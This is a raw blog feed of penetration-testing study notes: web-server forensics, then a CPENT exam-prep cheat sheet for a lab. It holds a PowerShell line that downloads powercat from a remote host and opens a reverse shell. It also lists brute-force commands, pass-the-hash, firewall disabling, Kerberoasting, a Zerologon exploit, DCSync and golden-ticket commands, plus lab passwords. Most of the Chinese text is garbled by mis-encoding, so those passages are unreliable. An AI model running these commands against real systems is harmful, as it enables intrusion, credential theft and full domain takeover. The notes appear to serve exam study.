class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> access.log.<span class="hljs-number">2</span>|grep -i &#x27;.php&#x27; | grep -Ei <span class="hljs-string">&quot;s.php|admine21_decode.php&quot;</span> -B <span class="hljs-number">10</span> | cut -d <span class="hljs-string">&quot; &quot;</span> -f <span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>|less<br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">zless access.log<span class="hljs-number">.2</span>.gz|<span class="hljs-type">grep</span> -iE <span class="hljs-string">&quot;\/s.php|admin21_decode.php&quot;</span> | <span class="hljs-type">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f <span class="hljs-number">1</span> | <span class="hljs-type">sort</span> |<span class="hljs-type">uniq</span><br></code></pre></td></tr></table></figure><ul><li>ps -ef</li><li>ls &#x2F;proc</li><li>strace -f -p pid</li><li>lsof -i:port</li><li>lsof -p pid</li><li>crontab -e</li><li>cat &#x2F;etc&#x2F;rc.local</li><li>ls &#x2F;etc&#x2F;init.d</li><li>ls &#x2F;etc&#x2F;profile.d</li><li>ls &#x2F;var&#x2F;log&#x2F;cron*</li><li>ls &#x2F;var&#x2F;log&#x2F;secure*</li></ul><h3 id="lab-windows7-iis-server-forensic"><a href="#lab-windows7-iis-server-forensic" class="headerlink" title="lab - windows7 iis server forensic"></a>lab - windows7 iis server forensic</h3><ul><li>History&amp;log<ul><li>web access log (iis log)</li><li>eventlog (4688,sysmon)</li></ul></li><li>Process<ul><li>services</li><li>connection</li></ul></li><li>File <ul><li>App (binary,script)</li><li>autoruns</li><li>config</li></ul></li><li>executing history<ul><li>shimacache</li><li>amcache</li></ul></li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">IEX(<span class="hljs-params">new</span>-<span class="hljs-params">object</span> <span class="hljs-params">system</span>.<span class="hljs-params">net</span>.<span class="hljs-params">webclient</span>)</span>.downloadstring(&#x27;http:<span class="hljs-comment">//ip/powercat.ps1&#x27;);powercat -c ip -p 4040 -e cmd.exe</span><br></code></pre></td></tr></table></figure><ul><li>windows webshell </li><li>parentprocessid:3444 </li><li>parentimage: w3wp.exe</li></ul>]]></content>
    
    
    <categories>
      
      <category>ç­†è¨˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CPENT-è€ƒå‰æº–å‚™</title>
    <link href="/2021/07/17/CPENT-%E8%80%83%E5%89%8D%E6%BA%96%E5%82%99/"/>
    <url>/2021/07/17/CPENT-%E8%80%83%E5%89%8D%E6%BA%96%E5%82%99/</url>
    
    <content type="html"><![CDATA[<h1 id="CPENT-è€ƒå‰æº–å‚™"><a href="#CPENT-è€ƒå‰æº–å‚™" class="headerlink" title="CPENT è€ƒå‰æº–å‚™"></a>CPENT è€ƒå‰æº–å‚™</h1><h2 id="ilabs"><a href="#ilabs" class="headerlink" title="ilabs"></a>ilabs</h2><ul><li><p>Windows server 2019 </p><ul><li>192.168.0.20</li><li>172.19.19.20</li></ul></li><li><p>Parrot</p><ul><li>192.168.0.18</li><li>172.19.19.18</li></ul></li><li><p>å¯†ç¢¼å™´ç‘</p><blockquote><p>kevin (username)</p></blockquote><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">Pa<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>w0rd123<br>owaspbwa<br></code></pre></td></tr></table></figure></li></ul><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><ul><li><p><b>ICMP å°åŒ… åŸºç¤çŸ¥è­˜</b></p><ul><li>è¨Šæ¯å‹æ…‹(message type)<ul><li>Type:8 Echo Requestï¼ˆå›æ‡‰è¦æ±‚ï¼‰ #è¦æ±‚å°æ–¹ä¸»æ©Ÿå›è²</li><li>Type:0 Echo Replyï¼ˆå›æ‡‰ç­”è¦†ï¼‰   #ä¸»æ©Ÿå›è²ç­”è¦†</li><li>Wiresharkæ¥æ”¶ICMPå°åŒ…<br>  <img src="https://i.imgur.com/58fxInL.png"></li></ul></li></ul></li><li><p><b>NMAP æª¢æ¸¬å­˜æ´»ä¸»æ©Ÿ(KEEP-ALIVE)</b></p><ul><li>ICMPæƒæ</li><li>nmap -sn ç‰¹æ¬Šæ¨¡å¼æƒæ <ul><li>LAN -&gt; ç™¼é€ARPå°åŒ…</li><li>WAN -&gt; ç™¼é€TCP SYN-&gt;443port,ACK-&gt;80port å°åŒ… ä»¥åŠicmp requests type8&#x2F;13ï¼Œè‹¥éƒ½ç„¡replyå³åˆ¤å®šclose  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> -n <span class="hljs-symbol">&lt;ip&gt;</span><br></code></pre></td></tr></table></figure></li><li>è‹¥é‚„æ˜¯ç„¡æ³•æ‰¾åˆ°å­˜æ´»ä¸»æ©Ÿï¼Œbypass keepaliveéšæ®µç›´æ¥é€²è¡Œportæƒæ  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -Pn -n -p21-<span class="hljs-number">25</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3389</span> &lt;ip&gt; <br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><b>åˆ—èˆ‰ç³»çµ±ç‰ˆæœ¬</b></p><ul><li><p>åˆ©ç”¨smb-os-discoveryæšèˆ‰ç³»çµ±ç‰ˆæœ¬</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmap -Pn -n -p139,445 <span class="hljs-attribute">--script</span>=smb-os-discovery &lt;ip&gt;<br></code></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/8ojliDs.png"></p></li><li><p>åˆ©ç”¨smb-protocolsæŸ¥è©¢å°æ–¹smbå¯æ”¯æ´å”è­°ç‰ˆæœ¬</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmap -Pn -n -p139,445 <span class="hljs-attribute">--script</span>=smb-protocols &lt;ip&gt;<br></code></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/sR7wRkv.png"></p></li></ul></li><li><p><b>å…§ç¶²è…³æœ¬æƒæ</b></p><ul><li>ping.sh  <figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript">#/bin/bash<br><br>network=<span class="hljs-string">&quot;192.168.50&quot;</span><br><br><span class="hljs-title function_">is_ping</span>(<span class="hljs-params"></span>)&#123;<br><br>ping -c <span class="hljs-number">1</span> -w <span class="hljs-number">1</span> $network.<span class="hljs-property">$i</span> &gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>[ $? -eq <span class="hljs-number">0</span> ] &amp;&amp; echo $i is up.<br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq <span class="hljs-number">1</span> <span class="hljs-number">255</span>)<br><span class="hljs-keyword">do</span> <br>is_ping $i<br>done<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="å…§ç¶²æ¸¬è©¦"><a href="#å…§ç¶²æ¸¬è©¦" class="headerlink" title="å…§ç¶²æ¸¬è©¦"></a>å…§ç¶²æ¸¬è©¦</h2><ul><li><p><b>Windowsç¶²è·¯èŠ³é„°</b></p><ul><li>UDP 137 -&gt; NETBIOS åç¨±è§£æ</li><li>UDP 138 -&gt; NETBIOS æœå‹™å®£å‘Š</li><li>TCP 139 -&gt; SMB&#x2F;CIFS (smbç‚ºå”å®šï¼Œcifsç‚ºæœå‹™)</li></ul></li><li><p><b>SMB&#x2F;CIFS (TCP 139,445)</b></p><ul><li>AUTHENTICATION (NTLM V1,V2) (ä¸»è¦ä½œç‚ºé©—è­‰æ‰‹æ®µ)</li><li>File &amp; Print sharing (æª”æ¡ˆåˆ†äº«)</li><li>IPC (inter-process communication)(remote cmd)</li></ul></li><li><p><b>åˆ†æ•£å¼é‹ç®—æ§åˆ¶Windows</b></p><ul><li>IPC (SMB)</li><li>RPC</li><li>WinRM &#x2F;WMI</li></ul></li><li><p><b>SMB VERSION</b></p><ul><li>v1</li><li>v2:support digital signature </li><li>v3:support encrypt</li></ul><p>   <img src="https://i.imgur.com/GJb3eJN.png"></p></li><li><p><b>NetBIOSåŸºç¤çŸ¥è­˜</b></p><ul><li>NetBIOS åç¨±<ul><li>Total 16 å­—å…ƒ</li><li>1-15:é›»è…¦åç¨±</li><li>16th:æœå‹™ä»£è™Ÿ</li></ul></li><li>nbtstat -n æŸ¥çœ‹æœ¬æ©Ÿnetbiosè¨»å†Šè³‡è¨Š<br>  <img src="https://i.imgur.com/vUO9PvL.png"></li></ul></li><li><p><b>nbtstat æŸ¥è©¢åˆ¥å°ä¸»æ©Ÿnetbiosè³‡è¨Š</b></p><ul><li><p>åˆ©ç”¨IPæŸ¥è©¢ (å¦‚ç„¡æ³•æŸ¥è©¢å¯èƒ½ç‚ºFWé˜»æ“‹)</p>  <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nbtstat</span> -A &lt;<span class="hljs-built_in">ip</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨computerNameè§£æIPæŸ¥è©¢</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nbtstat -a <span class="hljs-tag">&lt;<span class="hljs-name">computername</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>é—œé–‰é˜²ç«ç‰†</p>  <figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment">#èˆŠç‰ˆ</span><br>netsh firewall <span class="hljs-built_in">set</span> opmode disable<br><span class="hljs-comment">#æ–°ç‰ˆ(win2012/2019)</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure></li><li><p>IPtables è¨­ç‚ºå…è¨±</p>   <figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tp">sudo iptables -S<br>sudo iptables -<span class="hljs-keyword">P</span> INPUT <span class="hljs-keyword">ACC</span>EPT<br>sudo iptables -<span class="hljs-keyword">P</span> OUTPUT <span class="hljs-keyword">ACC</span>EPT<br></code></pre></td></tr></table></figure></li></ul></li><li><p><b>egress busting (Reverse å°å¤–çˆ†ç ´)</b></p><ul><li>ç›®æ¨™NC   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -nvz &lt;ip&gt; <span class="hljs-number">1</span>-<span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure></li><li>æœ¬åœ°ç›£è½  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wireshark</span> OR tcpdump -i eth0 tcp[<span class="hljs-number">13</span>]==<span class="hljs-number">2</span> # SYN<br></code></pre></td></tr></table></figure></li></ul></li><li><p><b>æš´åŠ›ç ´è§£</b></p><ul><li><p>windows smb auth (smbèªè­‰çˆ†ç ´)</p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">crackmapexec smb ip -u &lt;username <span class="hljs-keyword">or</span> <span class="hljs-built_in">file</span>&gt; -p &lt;password <span class="hljs-keyword">or</span> <span class="hljs-built_in">file</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>rdp brute (rdpèªè­‰çˆ†ç ´)</p>  <figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">crowbar -b rdp -v -U <span class="hljs-attribute">&lt;userfile&gt;</span> -C <span class="hljs-attribute">&lt;passfile&gt;</span> -s <span class="hljs-attribute">&lt;ip/CIDR&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>hydra ssh (sshçˆ†ç ´)</p>  <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">hydra -l <span class="hljs-keyword">user</span> <span class="hljs-title">-P</span> passfile ssh ip -F -V<br></code></pre></td></tr></table></figure></li><li><p>linux åŸ·è¡Œwindows cmd</p>  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">winexe -U &#x27;administrator%Pa$$w0rd&#x27; <span class="hljs-comment">//&lt;ip&gt; cmd.exe</span><br>pth-winexe -U &#x27;administrator%<span class="hljs-number">92937945</span>B<span class="hljs-number">51881434</span>1DE3F<span class="hljs-number">726500</span>D4FF:<span class="hljs-number">92937945</span>B<span class="hljs-number">51881434</span>1DE3F<span class="hljs-number">726500</span>D4FF&#x27; <span class="hljs-comment">//&lt;ip&gt; cmd.exe</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><b>RDPé€£ç·šç›¸é—œ</b></p><ul><li><p>rdesktop(åœæ›´)</p></li><li><p>xfreerdp (ç‰ˆæœ¬é ˆç‚º2.3.0)</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">lib <span class="hljs-keyword">so</span> æª¢æŸ¥<br>sudo dpkg -<span class="hljs-keyword">l</span> |<span class="hljs-keyword">grep</span> freerdp<br></code></pre></td></tr></table></figure></li><li><p>xfreerdp é€£ç·š</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfreerdp /v:172.19.19.20 /u:administrator /p:<span class="hljs-string">&#x27;Pa$$w0rd&#x27;</span> /size:90%<br></code></pre></td></tr></table></figure></li><li><p>é–‹å•Ÿrdp</p>  <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><b>Pivot è·³æ¿</b></p><ul><li><p>SSH port forwarding (SSH tunneling)</p><ul><li><p>Local</p><ul><li>ssh server(70) target(24)  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -nNTL *:<span class="hljs-number">80</span>:<span class="hljs-number">172.19.19.24:80</span> administrator@<span class="hljs-number">172.19.19.70</span><br></code></pre></td></tr></table></figure>  <img src="https://i.imgur.com/kOmzS3I.png"></li></ul></li><li><p>Remote</p><ul><li>nano &#x2F;etc&#x2F;ssh&#x2F;sshd_config <add GatewayPorts yes>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -R *:<span class="hljs-number">8008</span>:<span class="hljs-number">172.19.19.24:80</span> administrator@<span class="hljs-number">172.19.19.70</span><br></code></pre></td></tr></table></figure>  <img src="https://i.imgur.com/AJ4VstX.png"></li></ul></li><li><p>Dynamic (proxychain)</p><ul><li>nano &#x2F;etc&#x2F;proxychains.conf  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -nNTCD <span class="hljs-number">9050</span> administrator@<span class="hljs-number">172.19.19.70</span><br></code></pre></td></tr></table></figure>  <img src="https://i.imgur.com/ZK86vG5.png"></li></ul></li></ul></li><li><p>Port forwarding</p><ul><li>socat (full function,fat,support udp)<ul><li>socat tcp-listen:80,fork tcp:<ip>:80</li><li>socat udp-recvfrom:161,fork udp-sendto:<ip>:161</li></ul></li><li>datapipe   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/bovine/</span>datapipe<span class="hljs-regexp">/master/</span>datapipe.c<br><span class="hljs-comment">#ç¨‹å¼ç¬¬80è¡Œéœ€ä¿®æ”¹</span><br><span class="hljs-comment">#define MAXCLIENTS 20 æ”¹ç‚º 999</span><br></code></pre></td></tr></table></figure><ul><li>datapipe 0.0.0.0 135 <target> 135</li><li>datapipe 0.0.0.0 445 <target> 445</li><li>datapipe 0.0.0.0 4444 <parrot> 4444</li><li>gcc datapipe.c -o datapipe</li></ul></li><li>portproxy (windows netsh built-in)<ul><li>netsh interface portproxy add v4tov4 80 <ip> 80</li><li>netsh interface portproxy show v4tov4</li></ul></li></ul></li><li><p>meterpreter</p><ul><li>msf only</li><li>session routing</li><li>also support port forwarding</li></ul></li></ul></li></ul><h2 id="IOTåˆ†æ"><a href="#IOTåˆ†æ" class="headerlink" title="IOTåˆ†æ"></a>IOTåˆ†æ</h2><ul><li><p>ç·´ç¿’ç”¨</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Apress/i</span>ot-hack-hdbk-practical-guide<br>https:<span class="hljs-regexp">//</span>kb.netgear.com<span class="hljs-regexp">/26889/</span>D6000-Firmware-Version-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">41</span> <br></code></pre></td></tr></table></figure></li><li><p>binwalk no such file sasquatch(error)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/useidel/</span>sasquatch (gcc10 compile success)<br></code></pre></td></tr></table></figure></li><li><p>binwalk éŸŒé«”åˆ†æ</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">binwalk </span>firewarm.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure></li><li><p>binwalk æå–æª”æ¡ˆç³»çµ±</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">binwalk </span>-e firewam.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure></li><li><p>find &amp;&amp; grep æŸ¥æ‰¾</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -name *passwd* -print 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><span class="hljs-keyword">grep</span> -nir passwd <br></code></pre></td></tr></table></figure></li><li><p>squashFS ä»‹ç´¹</p></li></ul><blockquote><p>Squashfsï¼ˆ.sfsï¼‰æ˜¯ä¸€å¥—ä¾›Linuxæ ¸å¿ƒä½¿ç”¨çš„GPLé–‹æºåªè®€å£“ç¸®æª”æ¡ˆç³»çµ±ã€‚Squashfsèƒ½å¤ ç‚ºæª”æ¡ˆç³»çµ±å…§çš„æª”æ¡ˆã€inodeåŠç›®éŒ„çµæ§‹é€²è¡Œå£“ç¸®ï¼Œä¸¦æ”¯æ´æœ€å¤§1024åƒä½å…ƒçµ„çš„å€æ®µï¼Œä»¥æä¾›æ›´å¤§çš„å£“ç¸®æ¯”ã€‚<br>Squashfså¸¸è¢«ç”¨æ–¼å„Linuxç™¼è¡Œç‰ˆçš„LiveCDä¸­ï¼Œä¹Ÿç”¨æ–¼OpenWrt å’ŒDD-WRT çš„è·¯ç”±å™¨éŸŒé«”ã€‚Chromecastä¹Ÿæ˜¯è©²æª”æ¡ˆç³»çµ±çš„ä½¿ç”¨è€…ã€‚</p></blockquote><ul><li>hexdump å–å‡ºç¸½æ•¸æœ€å¤š(xor)<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">hexdump -v -C <span class="hljs-keyword">encrypted</span>.bin | cut -d &quot; &quot; -f <span class="hljs-number">3</span><span class="hljs-number">-20</span> |sort |uniq -c <br></code></pre></td></tr></table></figure></li></ul><h2 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h2><blockquote><p>Kerberosæ˜¯ä¸€ç¨®ç”±MITï¼ˆéº»çœç†å·¥å¤§å­¸ï¼‰æå‡ºçš„ä¸€ç¨®ç¶²è·¯èº«ä»½é©—è­‰å”è­°ã€‚å®ƒæ—¨åœ¨é€šéä½¿ç”¨é‡‘é‘°åŠ å¯†æŠ€è¡“ç‚ºå®¢æˆ¶ç«¯&#x2F;ä¼ºæœå™¨æ‡‰ç”¨ç¨‹å¼æä¾›å¼·èº«ä»½é©—è­‰ã€‚</p></blockquote><blockquote><p>èªè­‰ä¼ºæœå™¨ï¼ˆAuthentication Serverï¼Œç°¡ç¨± ASï¼‰<br>ç¥¨è­‰æˆæ¬Šç¥¨è­‰ï¼ˆTicket Granting Ticketï¼Œç°¡ç¨± TGTï¼‰<br>é‡‘é‘°åˆ†ç™¼ä¸­å¿ƒï¼ˆKey Distribution Centerï¼Œç°¡ç¨±KDCï¼‰<br>TGSï¼ˆTicket Granting Serverï¼‰&#x3D; ç¥¨æ“šæˆæ¬Šä¼ºæœå™¨<br>SSï¼ˆService Serverï¼‰&#x3D; ç‰¹å®šæœå‹™æä¾›ç«¯</p></blockquote><ul><li><p><b>kerberos æ¦‚è¿°åŠé€šä¿¡éç¨‹</b></p><ul><li>ASREQ: Clientå‘KDCç™¼èµ·ASREQ,è«‹æ±‚æ†‘æ“šæ˜¯Client hashåŠ å¯†çš„æ™‚é–“æˆ³</li><li>ASREP: KDCä½¿ç”¨Client hashé€²è¡Œè§£å¯†ï¼Œå¦‚æœçµæœæ­£ç¢ºå°±è¿”å›ç”¨krbtgt hashåŠ å¯†çš„TGTç¥¨æ“šï¼ŒTGTè£é¢åŒ…å«PAC,PACåŒ…å«Clientçš„sidï¼ŒClientæ‰€åœ¨çš„çµ„ã€‚ </li><li>TGSREQ: Clientæ†‘è—‰TGTç¥¨æ“šå‘KDCç™¼èµ·é‡å°ç‰¹å®šæœå‹™çš„TGSREQè«‹æ±‚ </li><li>TGS_REP: KDCä½¿ç”¨krbtgt hashé€²è¡Œè§£å¯†ï¼Œå¦‚æœçµæœæ­£ç¢ºï¼Œå°±è¿”å›ç”¨æœå‹™hash åŠ å¯†çš„TGSç¥¨æ“š(é€™ä¸€æ­¥ä¸ç®¡ä½¿ç”¨è€…æœ‰æ²’æœ‰è¨ªå•æœå‹™çš„è¨±å¯æ¬Šï¼Œåªè¦TGTæ­£ç¢ºï¼Œå°±è¿”å›TGSç¥¨æ“š) </li><li>AP_REQ: Clientæ‹¿è‘—TGSç¥¨æ“šå»è«‹æ±‚æœå‹™ </li><li>AP_REP: æœå‹™ä½¿ç”¨è‡ªå·±çš„hashè§£å¯†TGSç¥¨æ“šã€‚å¦‚æœè§£å¯†æ­£ç¢ºï¼Œå°±æ‹¿è‘—PACå»KDCé‚£é‚Šå•Clientæœ‰æ²’æœ‰è¨ªå•è¨±å¯æ¬Šï¼ŒåŸŸæ§è§£å¯†PACã€‚ç²å–Clientçš„sidï¼Œä»¥åŠæ‰€åœ¨çš„çµ„ï¼Œå†æ ¹æ“šè©²æœå‹™çš„ACLï¼Œåˆ¤æ–·Clientæ˜¯å¦æœ‰è¨ªå•æœå‹™çš„è¨±å¯æ¬Šã€‚<br><img src="https://i.imgur.com/11M0gNF.png"></li></ul></li><li><p><b>kerberoasting</b></p><ul><li>DC å‰µå»ºSPN<ul><li>setspn -s http&#x2F;lpt.com user-one (é¶æ©Ÿç’°å¢ƒ)</li></ul></li><li>Parrot SPN scan brute<ul><li>python3 -m pip install impacket â€“upgrade</li><li>GetUserSPNs.py â€˜lpt.com&#x2F;cpent:Pa$$w0rdâ€™ -dc-ip 192.168.177.19 -request -outputfile kerberos.txt</li><li>john kerberos.txt â€“show</li></ul></li></ul></li><li><p><b>Zerologon</b></p><ul><li><p>mimikatz </p><ul><li>æ¸…ç©ºDCèªè­‰å¯†ç¢¼  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::zerologon  /target:åŸŸæ§IP  /account:åŸŸæ§ä¸»æ©Ÿå$  /exploit<br>lsadump::zerologon /target:server2019 /account:server2019 /null /ntlm /exploit<br></code></pre></td></tr></table></figure></li><li>dcsync ç²å–ç›®æ¨™é›œæ¹Š(krbtgt)  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:lpt.com /dc:server2019 /authuser:administrator /authdomain:lpt.com /authpassword:Pa$<span class="hljs-variable">$w0rd</span> /user:krbtgt /authntlm<br></code></pre></td></tr></table></figure></li><li>Golden Ticket   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ³¨å…¥å…§å­˜å‰å¿…é ˆé–‹å•Ÿæ¬Šé™<br>privilege::debug<br>kerberos::golden /domain:lpt.com /sid:&lt;sid&gt; /krbtgt:&lt;<span class="hljs-built_in">hash</span>&gt; /user:evil /ticket:evil.tck /ptt<br></code></pre></td></tr></table></figure></li><li>pth  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::pth /user:administrator /domain:lpt.com /ntlm:&lt;<span class="hljs-built_in">hash</span>&gt;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>PowerView.ps1</p>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1<br>powershell -&gt; ç‰©ä»¶å°å‘ <br><br>cmd -&gt; powershell -nop -ep bypass  ###Bypass <span class="hljs-keyword">Policy</span><br><span class="hljs-keyword">Import</span>-Module .\powerview.ps1<br><br><span class="hljs-keyword">Get</span>-Forest  ### <span class="hljs-keyword">Domain</span> -&gt; Tree -&gt; Forest<br><span class="hljs-keyword">Get</span>-DomainComputer |<span class="hljs-keyword">select</span> -Property <span class="hljs-type">name</span>,dnshostname<br><span class="hljs-keyword">Get</span>-DomainUser | <span class="hljs-keyword">select</span> -Property <span class="hljs-type">name</span>,givenname<br><br>æŸ¥çœ‹å…±äº«è³‡æ–™å¤¾<br>net <span class="hljs-keyword">share</span><br>æŸ¥çœ‹é ç«¯å…±äº«è³‡æ–™å¤¾<br>net <span class="hljs-keyword">view</span> \\server2019\\<br>dir \\server2019\users<br></code></pre></td></tr></table></figure></li><li><p>åƒè€ƒè³‡æ–™</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">é€éssh ptT(pass the ticket)<br><span class="hljs-symbol">https:</span>//zhuanlan.zhihu.com/p/<span class="hljs-number">27242393</span><br>   <br>pass the ticketæŠ€å·§<br><span class="hljs-symbol">https:</span>//wooyun.js.org/drops/<span class="hljs-variable">%E5</span><span class="hljs-variable">%9</span>F<span class="hljs-variable">%9</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%97</span><span class="hljs-variable">%E9</span><span class="hljs-variable">%80</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%94</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%94</span>Pass<span class="hljs-variable">%20</span>The<span 